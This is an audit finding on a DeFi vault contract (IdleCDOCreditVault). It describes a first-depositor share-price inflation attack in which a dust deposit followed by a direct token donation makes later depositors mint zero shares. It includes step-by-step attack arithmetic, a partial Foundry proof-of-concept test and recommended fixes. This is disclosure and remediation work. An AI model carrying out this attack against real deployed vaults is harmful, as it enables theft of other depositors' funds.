### Title
First-depositor share-price inflation via direct `token` donation lets attacker steal subsequent depositors' funds - (File: contracts/IdleCDOCreditVault.sol)

### Summary
`IdleCDOCreditVault._updateAccounting` computes NAV with `getContractValue()`, which includes the raw `token` balance held by the CDO (`_contractTokenBalance(token)`). An unprivileged user can deposit a dust amount into an empty tranche, then `transfer()` a large amount of underlying directly to the vault. The donation is booked as a `totalGain` on the next interaction, inflating `priceAA`/`priceBB` via `_virtualPriceAux`. The next depositor's shares are minted with `_mintSharesAtCurrPrice` (`_amount * ONE_TRANCHE_TOKEN / _tranchePrice(_tranche)`), which rounds down to 0 at the inflated price, while their full `_amount` is still added to `lastNAVAA`/`lastNAVBB`. The attacker, holding essentially 100% of tranche supply, redeems the donated plus the victim's funds.

### Finding Description
Relevant code path in `contracts/IdleCDOCreditVault.sol`:

```solidity
function getContractValue() public override view returns (uint256) {
    return _contractTokenBalance(strategyToken) + _contractTokenBalance(token) - unclaimedFees;
}
```

`_deposit` (lines ~191-212) calls `_updateAccounting()` *before* pulling funds. `_updateAccounting` calls `getContractValue()` (line ~227), so raw underlying sent directly to the contract is counted as a positive `totalGain`, which `_virtualPriceAux` (lines ~287-336) splits into the tranche NAV and stores via `priceAA`/`priceBB`.

Attack sequence (AA tranche, USDC underlying, `oneToken = 1e6`):

1. Vault is freshly initialized; `AATranche.totalSupply() == 0`, `priceAA = 1e6`.
2. Attacker calls `depositAA(1)`: `_minted = 1 * 1e18 / 1e6 = 1e12` tranche tokens; `lastNAVAA = 1`.
3. Attacker `token.transfer(cdo, D)` with a large `D` (e.g. `100_000e6`). No shares are minted, but the vault's raw `token` balance is now `D + 1` (the deposited `1` was pushed to the strategy, minting strategyTokens, which also counts toward NAV — either way NAV includes it).
4. Victim calls `depositAA(V)` with e.g. `V = 1_000e6`. `_updateAccounting` runs first: `nav ≈ D + 1`, `_lastNAV = 1`, `totalGain ≈ D` (minus fee). Since BB supply is 0 / `lastNAV == lastTrancheNAV` path, the whole gain accrues to AA: `priceAA ≈ (1 + D) * 1e18 / 1e12` — an astronomically high price.
5. `_mintSharesAtCurrPrice` computes `_minted = V * 1e18 / priceAA ≈ V * 1e12 / D`. With `D = 1e11` and `V = 1e9`, `_minted` rounds down to 0 (or dust). `lastNAVAA += V` still executes, so the victim's funds join NAV while they receive nothing redeemable.
6. Attacker calls the withdrawal path (`requestWithdraw` / epoch claim, or `withdrawAA` where instant withdrawals are enabled) burning their `1e12` shares, redeeming ≈ `D + V + 1` underlying — the entire NAV.

The broken invariant is fair mint/burn: NAV is credited to a tranche without a commensurate share mint, and unsolicited `token` transfers are not excluded from the accounting NAV used to set `priceAA`.

### Impact Explanation
Direct theft: every subsequent depositor of the inflated tranche mints ~0 shares while their full deposit is absorbed into NAV controlled by the attacker. The attacker recovers their donation plus the victim's principal, losing only dust plus gas. Required attacker capital is the donation `D`, which is fully recoverable, so the attack is nearly free.

### Likelihood Explanation
Requires being the first depositor (or operating on a tranche with effectively-zero supply, e.g. BB before `isBBDepositEnabled` is flipped, or after full redemption) plus one direct `transfer`. Attacker only needs to pass whatever lender gating (`isWalletAllowed`/Keyring) applies — permitted per scope. The main open question is whether `IdleCDOEpochVariant`'s skim routine runs before `_updateAccounting` inside `_deposit` and neutralizes raw-token donations; on `IdleCDOCreditVault._deposit` itself there is no skim — `_updateAccounting` uses `getContractValue()` (which counts `_contractTokenBalance(token)`) rather than `_managedContractValue()` (which excludes it), so raw donations directly inflate the price used for minting. `virtualPrice()` uses `_managedContractValue` only for the view, not for the stored `priceAA`/`priceBB` that `_mintSharesAtCurrPrice` reads.

### Recommendation
- Use `_managedContractValue()` (strategy-token NAV only, raw underlying excluded) inside `_updateAccounting`, or skim raw `token` donations into the strategy / a sink *before* computing `totalGain`, so unsolicited transfers cannot be booked as yield.
- Alternatively/ additionally, mint dead shares at initialization (e.g. seed the first deposit to `address(0)` or enforce a minimum first-deposit amount) and/or enforce a `minSharesOut` slippage-style check in `_deposit` so a victim reverts instead of receiving 0 shares for a non-zero deposit.

### Proof of Concept
Foundry fork PoC sketch (against a deployed `IdleCDOCreditVault`-style proxy with USDC underlying):

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;
import "forge-std/Test.sol";

interface ICDO {
    function depositAA(uint256) external returns (uint256);
    function requestWithdraw(uint256, address) external; // or withdrawAA for instant mode
    function AATranche() external view returns (address);
    function priceAA() external view returns (uint256);
    function lastNAVAA() external view returns (uint256);
}
interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract ShareInflationTest is Test {
    ICDO cdo = ICDO(CDO_PROXY);
    IERC20 usdc = IERC20(UNDERLYING);
    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");

    function testInflation() public {
        deal(address(usdc), attacker, 200_000e6);
        deal(address(usdc), victim,    1_000e6);
        // whitelist both via Keyring if required (vm.prank on admin or fork state)

        vm.startPrank(attacker);
        usdc.approve(address(cdo), type(uint256).max);
        cdo.depositAA(1);                       // step 1: dust deposit
        usdc.transfer(address(cdo), 100_000e6); // step 2: donation inflates NAV
        vm.stopPrank();

        vm.startPrank(victim);
        usdc.approve(address(cdo), type(uint256).max);
        uint256 minted = cdo.depositAA(1_000e6);
        vm.stopPrank();

        uint256 victimShares = IERC20(cdo.AATranche()).balanceOf(victim);
        assertEq(victimShares, 0);              // victim received nothing
        assertGt(cdo.lastNAVAA(), 100_000e6);   // victim's 1_000e6 absorbed into NAV

        // step 3: attacker redeems ~101_000e6 via the vault's withdrawal flow
        // (requestWithdraw + epoch claim, or withdrawAA in instant mode)
    }
}
```

Note: the PoC must be run against the concrete deployed variant. If the deployed proxy routes deposits through `IdleCDOEpochVariant` and its `_skimDonatedAssets` path is executed before `_updateAccounting` with donations redirected outside NAV, the attack may be neutralized there; the base `IdleCDOCreditVault._deposit`/`_updateAccounting`/`getContractValue` path as written does include donated `token` in the price-setting NAV.